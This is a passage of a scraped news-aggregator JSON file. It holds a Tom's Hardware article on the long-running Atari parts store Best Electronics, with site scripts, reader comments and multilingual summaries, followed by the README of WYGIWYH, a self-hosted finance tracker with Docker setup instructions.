Electronics<\\/a>\"},\"src\":\"https:\\/\\/cdn.mos.cms.futurecdn.net\\/UTiNNYXxefNJi6Lq79Ns7h.png\",\"alt\":\"Atari parts and accessories store Best Electronics\",\"width\":1580,\"height\":1080,\"srcSetSizes\":[320,480,650,970,1024,1200],\"sizes\":{\"default\":\"calc(100vw - 40px)\",\"1000px\":\"970px\"},\"fullscreen\":false,\"lazyLoading\":true,\"addSEOMetaData\":false,\"removeNativeWidthRestriction\":false,\"dataBordeauxImageCheckAttr\":false,\"noCredit\":false}},{\"title\":\"\",\"description\":[],\"image\":{\"id\":\"FrsHcWTim2TvntUgFNEu7h\",\"name\":\"joysticks\",\"credit\":{\"text\":\"(Image credit: {subject})\",\"subject\":\"<a href=\\\"https:\\/\\/www.best-electronics-ca.com\\/\\\" target=\\\"_blank\\\">Best Electronics<\\/a>\"},\"src\":\"https:\\/\\/cdn.mos.cms.futurecdn.net\\/FrsHcWTim2TvntUgFNEu7h.jpg\",\"alt\":\"Atari parts and accessories store Best Electronics\",\"width\":835,\"height\":1081,\"srcSetSizes\":[320,480,650,970,1024,1200],\"sizes\":{\"default\":\"calc(100vw - 40px)\",\"1000px\":\"970px\"},\"fullscreen\":false,\"lazyLoading\":true,\"addSEOMetaData\":false,\"removeNativeWidthRestriction\":false,\"dataBordeauxImageCheckAttr\":false,\"noCredit\":false}},{\"title\":\"\",\"description\":[],\"image\":{\"id\":\"pKZsgG3mxi7GVM6ZyB2t9h\",\"name\":\"atari-compatible-site\",\"credit\":{\"text\":\"(Image credit: {subject})\",\"subject\":\"<a href=\\\"https:\\/\\/www.best-electronics-ca.com\\/\\\" target=\\\"_blank\\\">Best Electronics<\\/a>\"},\"src\":\"https:\\/\\/cdn.mos.cms.futurecdn.net\\/pKZsgG3mxi7GVM6ZyB2t9h.jpg\",\"alt\":\"Atari parts and accessories store Best Electronics\",\"width\":1532,\"height\":1025,\"srcSetSizes\":[320,480,650,970,1024,1200],\"sizes\":{\"default\":\"calc(100vw - 40px)\",\"1000px\":\"970px\"},\"fullscreen\":false,\"lazyLoading\":true,\"addSEOMetaData\":false,\"removeNativeWidthRestriction\":false,\"dataBordeauxImageCheckAttr\":false,\"noCredit\":false}}],\"progressText\":\"Image {currentSlide} of {totalSlides}\",\"viewOriginalText\":\"View Original\"}), \"https://slice.vanilla.futurecdn.net/13-2-0/js/imageGallery.js\");\n    } else {\n        console.error('%c FTE ','background: #9306F9; color: #ffffff','no lazy slice hydration function available');\n    }\nImage 1 of 3(Image credit: Best Electronics)(Image credit: Best Electronics)(Image credit: Best Electronics)As a previous owner of Atari ST, Falcon, Lynx and Jaguar hardware, looking through these products is like hunting through a treasure trove. Best Electronics says it lists 5,000+ Atari items on its site. But these are just the most popular items, so if you are after something that appears absent from the extensive parts and components lists, send the store an email to ask after it.Alternatively, go back in retail time by ordering the Best Rev. 10 All Atari catalog — a paper catalog of over 220 pages, making it about half an inch thick and 1.4 pounds in weight. Helpfully, the catalog includes 330 pictures of Atari bits, as well as extras like prototype information, repair tips and tricks, a complete list of Atari custom chips and replacement ICs, and more. Check out the two-page sample and more information on the Best Electronics site.\n    if (window.sliceHydrationLazy) {\n        window.sliceHydrationLazy(\"imageGallery-FnMgufN6kTGV9FcM3gG2Pf-zaHBNXFS3B4fVhENpYVb0VXmbRyNOb5T\", \"imageGallery\", JSON.stringify({\"galleryData\":[{\"title\":\"\",\"description\":[],\"image\":{\"id\":\"aQKig3xsSWWKyhZXRqsL6h\",\"name\":\"printer\",\"credit\":{\"text\":\"(Image credit: {subject})\",\"subject\":\"<a href=\\\"https:\\/\\/www.best-electronics-ca.com\\/\\\" target=\\\"_blank\\\">Best Electronics<\\/a>\"},\"src\":\"https:\\/\\/cdn.mos.cms.futurecdn.net\\/aQKig3xsSWWKyhZXRqsL6h.jpg\",\"alt\":\"Atari parts and accessories store Best Electronics\",\"width\":1517,\"height\":1080,\"srcSetSizes\":[320,480,650,970,1024,1200],\"sizes\":{\"default\":\"calc(100vw - 40px)\",\"1000px\":\"970px\"},\"fullscreen\":false,\"lazyLoading\":true,\"addSEOMetaData\":false,\"removeNativeWidthRestriction\":false,\"dataBordeauxImageCheckAttr\":false,\"noCredit\":false}},{\"title\":\"\",\"description\":[],\"image\":{\"id\":\"FFDzJheycXxERbpur52h4h\",\"name\":\"ST-HDDs\",\"credit\":{\"text\":\"(Image credit: {subject})\",\"subject\":\"<a href=\\\"https:\\/\\/www.best-electronics-ca.com\\/\\\" target=\\\"_blank\\\">Best Electronics<\\/a>\"},\"src\":\"https:\\/\\/cdn.mos.cms.futurecdn.net\\/FFDzJheycXxERbpur52h4h.jpg\",\"alt\":\"Atari parts and accessories store Best Electronics\",\"width\":1553,\"height\":991,\"srcSetSizes\":[320,480,650,970,1024,1200],\"sizes\":{\"default\":\"calc(100vw - 40px)\",\"1000px\":\"970px\"},\"fullscreen\":false,\"lazyLoading\":true,\"addSEOMetaData\":false,\"removeNativeWidthRestriction\":false,\"dataBordeauxImageCheckAttr\":false,\"noCredit\":false}}],\"progressText\":\"Image {currentSlide} of {totalSlides}\",\"viewOriginalText\":\"View Original\"}), \"https://slice.vanilla.futurecdn.net/13-2-0/js/imageGallery.js\");\n    } else {\n        console.error('%c FTE ','background: #9306F9; color: #ffffff','no lazy slice hydration function available');\n    }\nImage 1 of 2(Image credit: Best Electronics)(Image credit: Best Electronics)We've covered retro hardware holdouts before, with reports on the surprisingly recent demise of the floppy disk in Japan, German railway systems that still rely on MS-DOS and Windows 3.11, and even the Indiana bakery which still runs Commodore 64-powered cash registers. Nevertheless, Best Electronics dogged and extensive support for Atari fans still impresses.\n    window.sliceComponents = window.sliceComponents || {};\n\n    externalsScriptLoaded.then(() => {\n        window.reliablePageLoad.then(() => {\n            var componentContainer = document.querySelector(\"#slice-container-newsletterForm-articleInbodyContent-FnMgufN6kTGV9FcM3gG2Pf\");\n\n            if (componentContainer) {\n                var data = {\"layout\":\"inbodyContent\",\"header\":\"Stay On the Cutting Edge: Get the Tom's Hardware Newsletter\",\"tagline\":\"Get Tom's Hardware's best news and in-depth reviews, straight to your inbox.\",\"formFooterText\":\"By submitting your information you agree to the <a href=\\\"https:\\/\\/futureplc.com\\/terms-conditions\\/\\\" target=\\\"_blank\\\">Terms & Conditions<\\/a> and <a href=\\\"https:\\/\\/futureplc.com\\/privacy-policy\\/\\\" target=\\\"_blank\\\">Privacy Policy<\\/a> and are aged 16 or over.\",\"successMessage\":{\"body\":\"Thank you for signing up. You will receive a confirmation email shortly.\"},\"failureMessage\":\"There was a problem. Please refresh the page and try again.\",\"method\":\"POST\",\"inputs\":[{\"type\":\"hidden\",\"name\":\"NAME\"},{\"type\":\"email\",\"name\":\"MAIL\",\"placeholder\":\"Your Email Address\",\"required\":true},{\"type\":\"hidden\",\"name\":\"NEWSLETTER_CODE\",\"value\":\"XTH-X\"},{\"type\":\"hidden\",\"name\":\"LANG\",\"value\":\"EN\"},{\"type\":\"hidden\",\"name\":\"SOURCE\",\"value\":\"60\"},{\"type\":\"hidden\",\"name\":\"COUNTRY\"},{\"type\":\"checkbox\",\"name\":\"CONTACT_OTHER_BRANDS\",\"label\":{\"text\":\"Contact me with news and offers from other Future brands\"}},{\"type\":\"checkbox\",\"name\":\"CONTACT_PARTNERS\",\"label\":{\"text\":\"Receive email from us on behalf of our trusted partners or sponsors\"}},{\"type\":\"submit\",\"value\":\"Sign me up\",\"required\":true}],\"endpoint\":\"https:\\/\\/newsletter-subscribe.futureplc.com\\/v2\\/submission\\/submit\",\"analytics\":[{\"analyticsType\":\"widgetViewed\"}],\"ariaLabels\":{}};\n\n                var triggerHydrate = function() {\n                    window.sliceComponents.newsletterForm.hydrate(data, componentContainer);\n                }\n\n                if (window.lazyObserveElement) {\n                    window.lazyObserveElement(componentContainer, triggerHydrate);\n                } else {\n                    triggerHydrate();\n                }\n            }\n        }).catch(err => console.error('%c FTE ','background: #9306F9; color: #ffffff','Hydration Script has failed for newsletterForm-articleInbodyContent-FnMgufN6kTGV9FcM3gG2Pf Slice', err));\n    }).catch(err => console.error('%c FTE ','background: #9306F9; color: #ffffff','Externals script failed to load', err));\nStay On the Cutting Edge: Get the Tom's Hardware NewsletterGet Tom's Hardware's best news and in-depth reviews, straight to your inbox.Contact me with news and offers from other Future brandsReceive email from us on behalf of our trusted partners or sponsorsBy submitting your information you agree to the Terms & Conditions and Privacy Policy and are aged 16 or over.The last original hardware from Atari Corp. was the Jaguar console, introduced in 1993 and discontinued in 1996. That end date coincides with the filing for bankruptcy by the iconic firm. Sadly, the Atari branded products which arrived after this time were just rehashed and recycled wares designed to milk the firm's classic video games IP with minimal innovation.\n\nTOPICS\n\nAtari\n\nSee all comments (3)\n\nMark TysonSocial Links NavigationNews EditorMark Tyson is a news editor at Tom's Hardware. He enjoys covering the full breadth of PC tech; from business and semiconductor design to products approaching the edge of reason.\n\nRead more\n\nCES 2025 is the 40th anniversary of the Commodore 128 — the last 8-bit PC first appeared at CES 1985\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nMaker resurrects Toshiba T1000 with a Raspberry Pi 4 and a slew of upgrades\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nCommodore 64 gets a true Full-HD HDMI plus stereo sound daughterboard\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nAMD says Intel's 'horrible product' is causing Ryzen 7 9800X3D shortages\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nVendor rolls out two new decade-old Nvidia GT 730 GPUs — 2GB and 4GB models, starting at $45\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nRaspberry Pi Pico Spacewar controller brings vintage space combat to the 21st century\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nLatest in Retro Gaming\n\nU.S. Atari parts store still open after 41 years, has spent $100K+ designing new parts — last original Atari hardware launched 32 years ago\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nDoom ported to a standalone Microsoft Word document — plays well but there's no sound\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nCommodore 64 gets a true Full-HD HDMI plus stereo sound daughterboard\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nAfter 24 years of failure, The Legend of Zelda: Majora's Mask's blue dog has finally won a race\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nThe world’s smallest arcade machine fits in the palm of your hand — Arduino microcontroller powers tiny Pong arcade machine\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nAI-equipped light gun controller brings a retro title to the modern era — Play Time Crisis on modern TVs with low input latency\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nLatest in News\n\nIntel and SK hynix close NAND business deal: Intel gets $1.9 billion, SK hynix gets IP and employees\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nNvidia Breakfast Bytes are now available at Denny's if you want to experience the 'breakfast of geniuses'\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nZotac RTX 5090 GPUs with missing ROPs sold at premium price by German retailer\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nTaiwanese authorities accuse SMIC and allies of poaching engineers\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\n$3,700 RTX 5090 GPUs have found new homes after sitting on US retailer's shelves\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nNvidia's 50-series laptop launch looks bumpy: slipping ship dates, game crashes, and delayed review units\n\n<a style=\"position: relative!important;\" href=\"SPONSORED_LINK_URL\">\n<picture>\n<source srcset=\"SPONSORED_IMAGE_URL.webp\" type=\"image/webp\" />\n<img src=\"SPONSORED_IMAGE_URL\" alt=\"SPONSORED_HEADLINE\" loading=\"lazy\"/>\n</picture>\n<span class=\"text-base text-black font-bold mx-0 my-2.5 p-0\">SPONSORED_HEADLINE</span>\n</a>\n\nMore about retro gaming\n\nDoom ported to a standalone Microsoft Word document — plays well but there's no sound\n\nCommodore 64 gets a true Full-HD HDMI plus stereo sound daughterboard\n\nLatest\n\nDell Pro 14 Plus (P1425) 14-inch portable monitor review: Long on performance, short on value\n\nSee more latest\n\n3 Comments\n\nComment from the forums\n\nJabberwocky79\n\nWhile I wouldn't be in the market for anything, the fact that this exists is dang cool.\n\nReply\n\nAkroZ\n\nIt's a litlle inacurate: Atari Corporation didn't fill for bankruptcy in 1996, they merged with JT Storage, Inc to form JTS Corporation.\nAtari have liquidity but not new product (Jaguar has failed), JTS have stock but issues with liquidity. The merge should have keep the two brands.\nBut just after the merge, JTS fired most Atari staff and selled all the stocks. This was not enought to save JTS as they filled for bankruptcy in 1998.\n\nReply\n\nex_bubblehead\n\nBrad's been a life saver over the years when my 130XE or Mega4 ST (both highly modded) have needed parts or accessories. I think he still has a majority of the stock he bought when Atari shuttered in addition to new products he's introduced over the years. The first printing (and I think the only one to date) of his catalog reads like the old Sears Christmas Wish Book.\n\nReply\n\nView All 3 Comments\n\nMost Popular\n\nNvidia Breakfast Bytes are now available at Denny's if you want to experience the 'breakfast of geniuses'\n\nZotac RTX 5090 GPUs with missing ROPs sold at premium price by German retailer\n\nIntel and SK hynix close NAND business deal: Intel gets $1.9 billion, SK hynix gets IP and employees\n\nTaiwanese authorities accuse SMIC and allies of poaching engineers\n\nNvidia's 50-series laptop launch looks bumpy: slipping ship dates, game crashes, and delayed review units\n\n$3,700 RTX 5090 GPUs have found new homes after sitting on US retailer's shelves\n\nIntel's board gets industry-focused as three directors will not seek re-election — badly needed shift to deeper tech experience\n\nChina's AI data center boom goes bust: Rush leaves billions of dollars in idle infrastructure\n\nTSMC to reportedly speed up fab building in the US, third fab to begin construction this year\n\nEx-Intel CEO Gelsinger warns TSMC's $165B investment will not restore U.S. semiconductor leadership\n\nif(FUTR && FUTR.Connect){\n//Init Connect article History\nclass userNav {\nconstructor(key = 'connect_articles_history') {\nthis.key = key;\nthis.flushKey = `${key}_flush`;\nthis.propsKey = `${key}_props`;\nthis.store();\nconsole.info(\"FUTR.Connect.userNav - Init - Start - Using reduxStore\");\n}\nstore() {\nconst isArticle = window?.reduxStore?.getState()?.vanilla?.isArticle;\nif (typeof isArticle !== 'undefined' && isArticle && FUTR && FUTR.Connect) {\ntry {\nconst month = `${new Date().getFullYear()}-${new Date().getMonth()}`;\n//flush monthly\nif (localStorage.getItem(this.flushKey) !== month) {\nlocalStorage.setItem(this.key, btoa('[]'));\nlocalStorage.setItem(this.propsKey, []);\nlocalStorage.setItem(this.flushKey, month);\n}\nconst currentUrl = location.pathname;\nconst urls = JSON.parse(atob(localStorage.getItem(this.key) || btoa('[]')));\nconst props = JSON.parse(localStorage.getItem(this.propsKey)|| '[]');\nif (!urls.includes(currentUrl) && this.getProps().length < 20 || this.getProps().length <1) {\nurls.push(currentUrl);\nif (window.ffte && window.ffte.properties) {\nprops.push(window.ffte.properties);\nconsole.log(\"props push\", props)\n}\nlocalStorage.setItem(this.key, btoa(JSON.stringify(urls)));\nlocalStorage.setItem(this.propsKey, JSON.stringify(props));\n}\nconsole.info(\"FUTR.Connect.userNav - Urls Stored\");\n} catch (e) {\nconsole.warn('userNav:', e);\n}\n}\n}\ngetHistory() {\ntry {\nreturn JSON.parse(atob(localStorage.getItem(this.key) || btoa('[]')));\n} catch {\nreturn [];\n}\n}\ngetProps() {\ntry {\nreturn JSON.parse(localStorage.getItem(this.propsKey) || '[]');\n} catch {\nreturn [];\n}\n}\n};\nFUTR.Connect.userNav = new userNav();\nconsole.info(\"FUTR.Connect.userNav - Init - Done\", FUTR.Connect.userNav);\n}",
    "summary": {
      "en": "**Summary:**\n\nBest Electronics, a U.S. store specializing in Atari parts and accessories, has been operational for 41 years, continuing to support retro gaming enthusiasts. Despite Atari's bankruptcy in 1996 and the last original hardware release being 32 years ago, the store has invested over $100,000 in designing new parts and maintains a stock of over 5,000 popular Atari items. They also have many old products stored from a large purchase made during Atari's liquidation. The store offers exclusive parts and a comprehensive catalog for Atari fans. Their ongoing commitment to retro gaming shows a strong dedication to preserving Atari's legacy.",
      "ko": "Best Electronics는 아타리 부품과 액세서리를 전문으로 하는 미국의 상점으로, 41년 동안 운영되어 왔습니다. 이 상점은 레트로 게임을 사랑하는 팬들을 계속 지원하고 있습니다. 아타리가 1996년에 파산했으며, 마지막 원조 하드웨어가 출시된 지 32년이 지났지만, 이 상점은 새로운 부품 설계에 10만 달러 이상을 투자했습니다. 현재 5,000개 이상의 인기 아타리 제품을 보유하고 있습니다. 또한 아타리의 청산 과정에서 대량으로 구매한 오래된 제품들도 많이 저장되어 있습니다. 이 상점은 아타리 팬들을 위해 독점 부품과 포괄적인 카탈로그를 제공합니다. 레트로 게임에 대한 지속적인 헌신은 아타리의 유산을 보존하려는 강한 의지를 보여줍니다.",
      "ja": "アメリカの「ベストエレクトロニクス」は、アタリの部品やアクセサリーを専門に扱う店舗で、41年間にわたりレトロゲーム愛好者を支えてきました。アタリは1996年に破産し、最後のオリジナルハードウェアの発売からは32年が経過していますが、この店舗は新しい部品の設計に10万ドル以上を投資し、人気のあるアタリ製品を5,000点以上在庫しています。また、アタリの清算時に行った大規模な購入から、多くの古い製品も保管しています。店舗ではアタリファン向けに独自の部品や充実したカタログを提供しています。レトロゲームへの継続的な取り組みは、アタリの遺産を守る強い意志を示しています。"
    }
  },
  {
    "id": "9a7899558aa612ed",
    "title": {
      "en": "WYGIWYH: A self-hosted simple but powerful finance tracker",
      "ko": "내 손안의 재무 관리",
      "ja": "自分で管理する強力な家計簿"
    },
    "type": "story",
    "url": "https://github.com/eitchtee/WYGIWYH",
    "score": 12,
    "by": "indigodaddy",
    "time": 1743272195,
    "content": "WYGIWYH\n\nAn opinionated and powerful finance tracker.\n\n  Why •\n  Features •\n  Usage •\n  How •\n  Translate •\n  Caveats and Warnings •\n  Built with\n\nWYGIWYH (What You Get Is What You Have) is a powerful, principles-first finance tracker designed for people who prefer a no-budget, straightforward approach to managing their money. With features like multi-currency support, customizable transactions, and a built-in dollar-cost averaging tracker, WYGIWYH helps you take control of your finances with simplicity and flexibility.\n\nWhy WYGIWYH?\nManaging money can feel unnecessarily complex, but it doesn’t have to be. WYGIWYH (pronounced \"wiggy-wih\") is based on a simple principle:\n\nUse what you earn this month for this month. Any savings are tracked but treated as untouchable for future months.\n\nBy sticking to this straightforward approach, you avoid dipping into your savings while still keeping tabs on where your money goes.\nWhile this philosophy is simple, finding tools to make it work wasn’t. I initially used a spreadsheet, which served me well for years—until it became unwieldy as I started managing multiple currencies, accounts, and investments. I tried various financial management apps, but none met my key requirements:\n\nMulti-currency support to track income and expenses in different currencies.\nNot a budgeting app — as I dislike budgeting constraints.\nWeb app usability (ideally with mobile support, though optional).\nAutomation-ready API to integrate with other tools and services.\nCustom transaction rules for credit card billing cycles or similar quirks.\n\nFrustrated by the lack of comprehensive options, I set out to build WYGIWYH — an opinionated yet powerful tool that I believe will resonate with like-minded users.\nKey Features\nWYGIWYH offers an array of features designed to simplify and streamline your personal finance tracking:\n\nUnified transaction tracking: Record all your income and expenses, organized in one place.\nMultiple accounts support: Keep track of where your money and assets are stored (banks, wallets, investments, etc.).\nOut-of-the-box multi-currency support: Dynamically manage transactions and balances in different currencies.\nCustom currencies: Create your own currencies for crypto, rewards points, or any other models.\nAutomated adjustments with rules: Automatically modify transactions using customizable rules.\nBuilt-in Dollar-Cost Average (DCA) tracker: Essential for tracking recurring investments, especially for crypto and stocks.\nAPI support for automation: Seamlessly integrate with existing services to synchronize transactions.\n\nHow To Use\nTo run this application, you'll need Docker with docker-compose.\nFrom your command line:\n# Create a folder for WYGIWYH (optional)\n$ mkdir WYGIWYH\n\n# Go into the folder\n$ cd WYGIWYH\n\n$ touch docker-compose.yml\n$ nano docker-compose.yml\n# Paste the contents of https://github.com/eitchtee/WYGIWYH/blob/main/docker-compose.prod.yml and edit according to your needs\n\n# Fill the .env file with your configurations\n$ touch .env\n$ nano .env # or any other editor you want to use\n# Paste the contents of https://github.com/eitchtee/WYGIWYH/blob/main/.env.example and edit accordingly\n\n# Run the app\n$ docker compose up -d\n\n# Create the first admin account\n$ docker compose exec -it web python manage.py createsuperuser\n\nNoteIf you're using Unraid, you don't need to follow these steps, use the app on the store. Make sure to read the Unraid section and Environment Variables for an explanation of all available variables\n\nRunning locally\nIf you want to run WYGIWYH locally, on your env file:\n\nRemove URL\nSet HTTPS_ENABLED to false\nLeave the default DJANGO_ALLOWED_HOSTS (localhost 127.0.0.1 [::1])\n\nYou can now access localhost:OUTBOUND_PORT\nNote\n\nIf you're planning on running this behind Tailscale or other similar service also add your machine given IP to DJANGO_ALLOWED_HOSTS\nIf you're going to use another IP that isn't localhost, add it to DJANGO_ALLOWED_HOSTS, without http://\n\nLatest changes\nFeatures are only added to main when ready, if you want to run the latest version, you must build from source or use the :nightly tag on docker. Keep in mind that there can be undocumented breaking changes.\nAll the required Dockerfiles are here.\nUnraid\nnwithan8 has kindly provided a Unraid template for WYGIWYH, have a look at the unraid_templates repo.\nWYGIWYH is available on the Unraid Store. You'll need to provision your own postgres (version 15 or up) database.\nTo create the first user, open the container's console using Unraid's UI, by clicking on WYGIWYH icon on the Docker page and selecting Console, then type python manage.py createsuperuser, you'll them be prompted to input your e-mail and password.\nEnvironment Variables\n\nvariable\ntype\ndefault\nexplanation\n\nDJANGO_ALLOWED_HOSTS\nstring\nlocalhost 127.0.0.1\nA list of space separated domains and IPs representing the host/domain names that WYGIWYH site can serve. Click here for more details\n\nHTTPS_ENABLED\ntrue|false\nfalse\nWhether to use secure cookies. If this is set to true, the cookie will be marked as “secure”, which means browsers may ensure that the cookie is only sent under an HTTPS connection\n\nURL\nstring\nhttp://localhost http://127.0.0.1\nA list of space separated domains and IPs (with the protocol) representing the trusted origins for unsafe requests (e.g. POST). Click here for more details\n\nSECRET_KEY\nstring\n\"\"\nThis is used to provide cryptographic signing, and should be set to a unique, unpredictable value.\n\nDEBUG\ntrue|false\nfalse\nTurns DEBUG mode on or off, this is useful to gather more data about possible errors you're having. Don't use in production.\n\nSQL_DATABASE\nstring\nNone *required\nThe name of your postgres database\n\nSQL_USER\nstring\nuser\nThe username used to connect to your postgres database\n\nSQL_PASSWORD\nstring\npassword\nThe password used to connect to your postgres database\n\nSQL_HOST\nstring\nlocalhost\nThe address used to connect to your postgres database\n\nSQL_PORT\nstring\n5432\nThe port used to connect to your postgres database\n\nSESSION_EXPIRY_TIME\nint\n2678400 (31 days)\nThe age of session cookies, in seconds. E.g. how long you will stay logged in\n\nENABLE_SOFT_DELETE\ntrue|false\nfalse\nWhether to enable transactions soft delete, if enabled, deleted transactions will remain in the database. Useful for imports and avoiding duplicate entries.\n\nKEEP_DELETED_TRANSACTIONS_FOR\nint\n365\nTime in days to keep soft deleted transactions for. If 0, will keep all transactions indefinitely. Only works if ENABLE_SOFT_DELETE is true.\n\nTASK_WORKERS\nint\n1\nHow many workers to have for async tasks. One should be enough for most use cases\n\nHow it works\nCheck out our Wiki for more information.\nHelp us translate WYGIWYH!\n\nNoteLogin with your github account\n\nCaveats and Warnings\n\nI'm not an accountant, some terms and even calculations might be wrong. Make sure to open an issue if you see anything that could be improved.\nPretty much all calculations are done at run time, this can lead to some performance degradation. On my personal instance, I have 3000+ transactions over 4+ years and 4000+ exchange rates, and load times average at around 500ms for each page, not bad overall.\nThis isn't a budgeting or double-entry-accounting application, if you need those features there's a lot of options out there, if you really need them in WYGIWYH, open a discussion.\n\nBuilt with\nWYGIWYH is possible thanks to a lot of amazing open source tools, to name a few:\n\nDjango\nHTMX\n_hyperscript\nProcrastinate\nBootstrap\nTailwind\nWebpack\nPostgreSQL\nDjango REST framework\nAlpine.js",
    "summary": {
